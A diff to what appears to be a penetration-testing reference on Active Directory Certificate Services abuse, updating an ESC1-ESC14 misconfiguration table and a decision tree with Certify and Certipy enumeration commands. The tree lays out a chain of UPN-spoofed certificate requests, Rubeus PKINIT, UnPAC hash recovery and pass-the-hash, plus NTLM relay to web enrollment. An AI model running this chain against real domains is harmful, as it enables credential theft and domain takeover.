@@ -26,7 +26,7 @@ opsec_notes: |
   authentication is normal behavior, and forged certificates are hard to distinguish
   from legitimate ones.
 gotchas: |
-  ADCS must be deployed in the environment. Verify with Certify find or Certipy find.
+  ADCS must be deployed. Use a version-verified Certify or Certipy reference to enumerate it.
 related_ttps: [certify, certify-v2, certipy, adcs-esc4, adcs-esc6, adcs-esc8,
                rubeus, pkinittools, whisker, forgecert, passthecert]
 alternatives: []
@@ -72,20 +72,24 @@ SpecterOps' "Certified Pre-Owned" whitepaper (Will Schroeder + Lee Christensen, 
 | ESC8 | Web enrollment | HTTP NTLM relay to ADCS | DC cert via relay | ntlmrelayx + Certipy |
 | ESC9 | Template | No Security Extension | SAN bypass | Certipy v4+ |
 | ESC10 | Domain | Weak cert mapping | Alt auth path | Certipy v4+ |
-| ESC13 | Template | Issuance Policy OID | Group membership gain | Certify v2 |
-| ESC14 | Template | DNS SAN requirement | DNS principal auth | Certify v2 |
+| ESC13 | Template | Issuance Policy OID | Group membership gain | Version-verified tooling |
+| ESC14 | Certificate mapping | Mapping and identity conditions vary | Identity confusion | Version-verified tooling |
+
+This is a conceptual map. A tool name in the table does not establish that the exact
+binary detects, classifies, or exploits every listed condition.
 
 ## Attack Flow Decision Tree
 
 ```
 Step 1: Does ADCS exist?
-  Certify.exe find (or Certipy find)
-  → If no templates/CAs found: ADCS not deployed; skip
+  Certify.exe enum-cas (or Certipy find)
+  → Empty or incomplete output does not prove ADCS is absent; resolve access/query/error context
 
 Step 2: Any vulnerable templates (ESC1-8)?
-  Certify.exe find /vulnerable
+  Certify.exe enum-templates --filter-vulnerable
   → ESC1 found: FASTEST PATH
-    Certify request /altname:administrator → Rubeus PKINIT → UnPAC hash → PTH
+    Certify request --ca SERVER\CA-NAME --template TEMPLATE --upn USER@DOMAIN
+    → Rubeus PKINIT → UnPAC hash → PTH
 
 Step 3: No ESC1/3/6/8?
   Check ESC4 (template write access):
@@ -100,8 +104,8 @@ Step 5: Check ESC8 (web enrollment relay):
   Is http://CA/certsrv accessible without HTTPS enforcement?
   ntlmrelayx + coercion → DC cert → PKINIT
 
-Step 6: Check newer ESCs (13-16):
-  Certify v2 find /vulnerable
+Step 6: Check newer ESC conditions:
+  Use a tool/reference whose exact version is verified to classify the condition
 ```
 
 ## The PKINIT → UnPAC Chain (No Cracking Required)
